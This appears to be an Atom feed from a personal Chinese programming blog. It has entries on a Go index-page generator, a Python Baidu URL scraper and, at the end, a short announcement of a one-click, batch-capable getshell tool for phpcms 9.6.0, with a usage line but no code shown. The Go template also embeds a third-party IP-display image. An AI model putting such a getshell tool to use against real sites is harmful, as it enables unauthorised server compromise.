<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  <subtitle>Python &amp; Hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://akkuman.coding.me/"/>
  <updated>2017-04-13T13:26:31.560Z</updated>
  <id>http://akkuman.coding.me/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自己网盘的页面生成器(私用公开-Golang)</title>
    <link href="http://akkuman.coding.me/2017/04/13/my-yun-generateHTML-with-golang.html"/>
    <id>http://akkuman.coding.me/2017/04/13/my-yun-generateHTML-with-golang.html</id>
    <published>2017-04-13T08:41:34.000Z</published>
    <updated>2017-04-13T13:26:31.560Z</updated>
    
    <content type="html"><![CDATA[<p>虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的</p>
<h2 id="关于搭建"><a href="#关于搭建" class="headerlink" title="关于搭建"></a>关于搭建</h2><p>这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）<br><a id="more"></a></p>
<h2 id="关于页面的生成"><a href="#关于页面的生成" class="headerlink" title="关于页面的生成"></a>关于页面的生成</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>那时候只有两三个文件，html页面是我手写的手动增加的</p>
<h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>此时已经有了一个子目录，文件开始增多，我开始考虑写个简单的先用着，Python的写了，不过速度感觉有点不如意（原谅我的吹毛求疵）,并且有个麻烦事是每次重装系统后需要安装Python，然后我选用了Golang，时间仓促写了一个单页面生成，不进行目录深度遍历的，也就是说我每次新开一个目录需要把这个程序拷贝到当目录下双击生成html</p>
<h4 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h4><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//用来作为自己的建议网盘小型index目录使用，配合resilio sync同步然后生成index.html</span></div><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"bufio"</span></div><div class="line">    <span class="string">"fmt"</span></div><div class="line">    <span class="string">"io/ioutil"</span></div><div class="line">    <span class="string">"os"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> htmltext <span class="keyword">string</span></div><div class="line">    <span class="keyword">var</span> filenames []<span class="keyword">string</span></div><div class="line"></div><div class="line">    <span class="comment">//遍历.（本）目录下的所有文件（注意不是递归遍历，这里只是一次遍历）</span></div><div class="line">    files, err := ioutil.ReadDir(<span class="string">"."</span>)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        os.Exit(<span class="number">1</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</div><div class="line">        <span class="comment">//生成的html中的文件目录排除.sync和generateHTML.exe和index.html</span></div><div class="line">        <span class="keyword">if</span> file.Name() != <span class="string">".sync"</span> &amp;&amp; file.Name() != <span class="string">"generateHTML.exe"</span> &amp;&amp; file.Name() != <span class="string">"index.html"</span> &#123;</div><div class="line">            filenames = <span class="built_in">append</span>(filenames, file.Name())</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//文件名信息拼接成所需的html代码</span></div><div class="line">    <span class="keyword">for</span> _, name := <span class="keyword">range</span> filenames &#123;</div><div class="line">        htmltext += <span class="string">"            &lt;li&gt;&lt;a href=\"./"</span> + name + <span class="string">"\"&gt;"</span> + name + <span class="string">"&lt;/a&gt;&lt;/li&gt;\n"</span></div><div class="line">    &#125;</div><div class="line">    AllHTML := <span class="string">"&lt;html&gt;\n\t&lt;head&gt;\n\t\t&lt;meta charset=\"utf-8\"&gt;\n\t\t&lt;title&gt;Akkuman's Content&lt;/title&gt;\n\t&lt;/head&gt;\n\t&lt;body&gt;\n\t\t&lt;h1&gt;Akkuman's Content:&lt;/h1&gt;\n\t\t&lt;ul type=\"circle\"&gt;\n"</span> +</div><div class="line">        htmltext +</div><div class="line">        <span class="string">"\t\t&lt;img src=\"http://ip.ntrqq.net/images/titan.png?wd=b25pY3lhbiBkYWlzdWtp\" border=\"0\" /&gt;\n\t\t&lt;/ul&gt;\n\t&lt;/body&gt;\n&lt;/html&gt;"</span></div><div class="line"></div><div class="line">    <span class="comment">//打开文件，如果文件不存在就创建，如果文件存在就打开并且清空，然后写入html代码</span></div><div class="line">    TxtHTML, err := os.OpenFile(<span class="string">"index.html"</span>, os.O_CREATE|os.O_TRUNC|os.O_RDWR, <span class="number">0660</span>)</div><div class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">        fmt.Println(<span class="string">"OpenFile Error:"</span> + err.Error())</div><div class="line">    &#125;</div><div class="line">    HTMLWriter := bufio.NewWriter(TxtHTML)</div><div class="line">    <span class="keyword">defer</span> TxtHTML.Close()</div><div class="line">    HTMLWriter.WriteString(AllHTML)</div><div class="line">    HTMLWriter.Flush()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h3><p>文件夹和文件日益增多，上面的方式我已经感觉到特别繁琐了，需要找个机会把代码重构一下，使他更加优化<br>然后我开始着手写第二版，这个版本我没保留，具体功能就是对上一个版本做了一点改进，使它支持了深度遍历<br>但是自从<strong>T00ls灵车漂移事件以来，官方管理员给<em>GetWriter</em>老哥（如果谁认识希望告知，希望能致个歉）的一纸封书将此事推上风口浪尖，作为始作俑者，我网站首当其冲，遭受了大量老哥多来自夜间的洗礼（说实话，希望高抬贵手，流量快没了）</strong>，这件事情持续发酵了两三天，我一直在思考，如何为老哥们带来更良好的观感体验，于是我觉得应该要让这个页面生成器对前端展示的修改更加方便，无须从代码入手，开始了第三版的编写</p>
<h4 id="暂时实现的功能"><a href="#暂时实现的功能" class="headerlink" title="暂时实现的功能"></a>暂时实现的功能</h4><ul>
<li>支持模板</li>
<li>加入了配置文件（其实也是模板）</li>
<li>加入了noView.txt规则（具体表现为这个txt中的文件名将不参与生成html页面）<br>可能以后会抽时间再进行优化，这个时间不定，看哪天自己的需求更高了</li>
</ul>
<h4 id="代码如下-1"><a href="#代码如下-1" class="headerlink" title="代码如下"></a>代码如下</h4><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bufio"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io/ioutil"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line">	<span class="string">"path/filepath"</span></div><div class="line">	<span class="string">"strings"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">//删除[]string切片中的值</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">remove</span><span class="params">(slice []<span class="keyword">string</span>, elems <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> i, strText := <span class="keyword">range</span> slice &#123;</div><div class="line">		<span class="keyword">if</span> strText == elems &#123;</div><div class="line">			slice = <span class="built_in">append</span>(slice[:i], slice[i+<span class="number">1</span>:]...)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> slice</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//读取每一行，handler是对每一行进行自定义操作的函数类型参数</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadPerLine</span><span class="params">(fileName <span class="keyword">string</span>, handler <span class="keyword">func</span>(<span class="keyword">string</span>)</span>) <span class="title">error</span></span> &#123;</div><div class="line">	f, err := os.Open(fileName)</div><div class="line">	<span class="keyword">defer</span> f.Close()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> err</div><div class="line">	&#125;</div><div class="line">	buf := bufio.NewScanner(f)</div><div class="line">	<span class="keyword">for</span> buf.Scan() &#123;</div><div class="line">		line := buf.Text()</div><div class="line">		handler(line)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//递归遍历返回所有dir文件夹</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDirList</span><span class="params">(path <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> dirNames []<span class="keyword">string</span></div><div class="line">	err := filepath.Walk(path, <span class="function"><span class="keyword">func</span><span class="params">(path <span class="keyword">string</span>, info os.FileInfo, err error)</span> <span class="title">error</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> info == <span class="literal">nil</span> &#123;</div><div class="line">			<span class="keyword">return</span> err</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> info.IsDir() &#123;</div><div class="line">			dirNames = <span class="built_in">append</span>(dirNames, path)</div><div class="line">			<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">	&#125;)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Printf(<span class="string">"filepath.Walk() return %v\n"</span>, err)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> dirNames</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//表层遍历dirname目录文件（夹），不是递归遍历，并且去掉指定文件（夹）名</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">walkDir</span><span class="params">(dirname <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> filenames []<span class="keyword">string</span></div><div class="line">	<span class="comment">//遍历dir目录下的所有文件（注意不是递归遍历，这里只是一次遍历）</span></div><div class="line">	<span class="comment">//并且生成的文件名排除.sync和generateHTML.exe和index.html</span></div><div class="line">	files, err := ioutil.ReadDir(dirname)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		os.Exit(<span class="number">1</span>)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</div><div class="line">		filenames = <span class="built_in">append</span>(filenames, file.Name())</div><div class="line">	&#125;</div><div class="line">	<span class="comment">// 读取noView.txt每一行，如果文件名在noView中就从filenames中删除这个元素</span></div><div class="line">	<span class="keyword">if</span> err := ReadPerLine(<span class="string">"noView.txt"</span>, <span class="function"><span class="keyword">func</span><span class="params">(line <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> line != <span class="string">""</span> &#123;</div><div class="line">			filenames = remove(filenames, line)</div><div class="line">		&#125;</div><div class="line">	&#125;); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Printf(<span class="string">"read noView.txt Error, return %v\n"</span>, err)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> filenames</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//读取解析配置文件，返回一个值键对对应的map</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">getTemplateConfig</span><span class="params">(filename <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, error)</span></span> &#123;</div><div class="line">	templateMap := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;&#125;</div><div class="line">	<span class="keyword">if</span> err := ReadPerLine(filename, <span class="function"><span class="keyword">func</span><span class="params">(line <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> line != <span class="string">""</span> &#123;</div><div class="line">			config := strings.SplitN(line, <span class="string">": "</span>, <span class="number">2</span>)</div><div class="line">			templateMap[config[<span class="number">0</span>]] = config[<span class="number">1</span>]</div><div class="line">		&#125;</div><div class="line">	&#125;); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Printf(<span class="string">"parse config.config Error,Please Check its validity,return %s\n"</span>, err)</div><div class="line">		<span class="keyword">return</span> templateMap, err</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> templateMap, <span class="literal">nil</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//打开并保存文件filename，如果文件不存在就创建，如果文件存在就打开并且清空，然后写入content</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">saveFile</span><span class="params">(filename <span class="keyword">string</span>, content *<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</div><div class="line">	TxtHTML, err := os.OpenFile(filename, os.O_CREATE|os.O_TRUNC|os.O_RDWR, <span class="number">0660</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"OpenFile Error:"</span> + err.Error())</div><div class="line">		<span class="keyword">return</span> err</div><div class="line">	&#125;</div><div class="line">	HTMLWriter := bufio.NewWriter(TxtHTML)</div><div class="line">	<span class="keyword">defer</span> TxtHTML.Close()</div><div class="line">	HTMLWriter.WriteString(*content)</div><div class="line">	HTMLWriter.Flush()</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	start := time.Now().Nanosecond()</div><div class="line">	<span class="keyword">for</span> _, dirname := <span class="keyword">range</span> getDirList(<span class="string">"."</span>) &#123;</div><div class="line">		<span class="keyword">var</span> liText <span class="keyword">string</span></div><div class="line">		filenames := walkDir(dirname)</div><div class="line"></div><div class="line">		templateHTML, err := ioutil.ReadFile(<span class="string">"Template.html"</span>)</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"open Template.html Error,Please check if the Template.html exists"</span>)</div><div class="line">			os.Exit(<span class="number">1</span>)</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="comment">//文件名信息拼接成li列表,然后将解析好的内容放入AllHTML</span></div><div class="line">		<span class="keyword">for</span> _, name := <span class="keyword">range</span> filenames &#123;</div><div class="line">			liText += <span class="string">"			&lt;li&gt;&lt;a href=\"./"</span> + name + <span class="string">"\" target=\"_Blank\"&gt;"</span> + name + <span class="string">"&lt;/a&gt;&lt;/li&gt;\n"</span></div><div class="line">		&#125;</div><div class="line">		AllHTML := strings.Replace(<span class="keyword">string</span>(templateHTML), <span class="string">"&#123;&#123;content_li&#125;&#125;"</span>, liText, <span class="number">-1</span>)</div><div class="line">		configHTMLMap, err := getTemplateConfig(<span class="string">"config.config"</span>)</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Printf(<span class="string">"Config ReadLine Error %v\n"</span>, err)</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">for</span> k, v := <span class="keyword">range</span> configHTMLMap &#123;</div><div class="line">			AllHTML = strings.Replace(AllHTML, <span class="string">"&#123;&#123;"</span>+k+<span class="string">"&#125;&#125;"</span>, v, <span class="number">-1</span>)</div><div class="line">		&#125;</div><div class="line">		<span class="comment">//保存index.html</span></div><div class="line">		<span class="keyword">if</span> err := saveFile(dirname+<span class="string">"/index.html"</span>, &amp;AllHTML); err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Printf(<span class="string">"saveFile Error,return %v\n"</span>, err)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	end := time.Now().Nanosecond()</div><div class="line">	fmt.Printf(<span class="string">"程序用时:%fms"</span>, <span class="keyword">float32</span>(end-start)/<span class="number">1000000</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="至于前端"><a href="#至于前端" class="headerlink" title="至于前端"></a>至于前端</h2><p>你们别想了，前端之魂在我体内没存在过，哪天兴致来了可能会看看相关知识，这个丑页面就丑着凑合看吧，如果有能力可以进行二次修改</p>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><ul>
<li>优化了一处之前写得比较冗余的代码，代码性能提升了一倍，约几个毫秒吧</li>
<li>增加了生成所花费的时间显示</li>
</ul>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>这次不能给抓住机会了，放github吧</p>
<ul>
<li><a href="https://github.com/akkuman/generateIndexHTML" target="_blank" rel="external">代码下载地址</a></li>
<li><a href="https://github.com/akkuman/generateIndexHTML/bin" target="_blank" rel="external">二进制文件下载地址</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽说我的网盘（exm，也许页面确实丑了点，不过页面生成的样式你自己可以改）美工已经被乱刀砍死，但是还是有小伙伴问我是怎么搭建的&lt;/p&gt;
&lt;h2 id=&quot;关于搭建&quot;&gt;&lt;a href=&quot;#关于搭建&quot; class=&quot;headerlink&quot; title=&quot;关于搭建&quot;&gt;&lt;/a&gt;关于搭建&lt;/h2&gt;&lt;p&gt;这个真没什么好说的，vps我只安装了nginx，然后配置域名指向到我的同步目录，然后用其他工具同步上去就行了（关于问自己手动同步麻烦的，其实并不麻烦，有很多好用的软件，本人用的Resilio Sync）&lt;br&gt;
    
    </summary>
    
      <category term="Golang" scheme="http://akkuman.coding.me/categories/Golang/"/>
    
    
      <category term="Golang" scheme="http://akkuman.coding.me/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>百度搜索引擎取真实地址-python代码</title>
    <link href="http://akkuman.coding.me/2017/04/11/BaiduSearch-get-realUrl-with-python.html"/>
    <id>http://akkuman.coding.me/2017/04/11/BaiduSearch-get-realUrl-with-python.html</id>
    <published>2017-04-11T04:49:06.000Z</published>
    <updated>2017-04-11T05:09:18.329Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="示例用法"><a href="#示例用法" class="headerlink" title="示例用法"></a>示例用法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</div><div class="line">&#125;</div><div class="line"></div><div class="line">def parseBaidu(keyword, pagenum)</div><div class="line"></div><div class="line">def main():</div><div class="line">    for url in parseBaidu("keyword",10):</div><div class="line">        if url:</div><div class="line">            print(url)</div><div class="line">        else:</div><div class="line">            continue</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;parseBaidu&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(keyword, pagenum)&lt;/span&gt;:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    keywordsBaseURL = &lt;span class=&quot;string&quot;&gt;&#39;https://www.baidu.com/s?wd=&#39;&lt;/span&gt; + str(quote(keyword)) + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;oq=&#39;&lt;/span&gt; + str(quote(keyword)) + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;ie=utf-8&#39;&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;pn=&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    pnum = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; pnum &amp;lt;= int(pagenum):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        baseURL = keywordsBaseURL + str(pnum*&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            request = requests.get(baseURL, headers=headers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            soup = BeautifulSoup(request.text, &lt;span class=&quot;string&quot;&gt;&quot;html.parser&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; a &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; soup.select(&lt;span class=&quot;string&quot;&gt;&#39;div.c-container &amp;gt; h3 &amp;gt; a&#39;&lt;/span&gt;):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                url = requests.get(a[&lt;span class=&quot;string&quot;&gt;&#39;href&#39;&lt;/span&gt;], headers=headers).url&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; url&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;None&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;finally&lt;/span&gt;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            pnum += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://akkuman.coding.me/categories/Python/"/>
    
    
      <category term="Python" scheme="http://akkuman.coding.me/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>phpcms9-6-0 一键getshell工具</title>
    <link href="http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html"/>
    <id>http://akkuman.coding.me/2017/04/10/phpcms9-6-0-getshell-with-python.html</id>
    <published>2017-04-10T05:13:29.000Z</published>
    <updated>2017-04-11T05:12:31.698Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li>一键化<code>python 1.py http://xxx.com</code>,如果是批量直接运行py文件即可</li>
</ul>
<h2 id="待办"><a href="#待办" class="headerlink" title="待办"></a>待办</h2><ul>
<li>[] 加入对有验证码phpcms网站的支持</li>
<li>[] 加入批量(<strong>已完成</strong>)</li>
</ul>
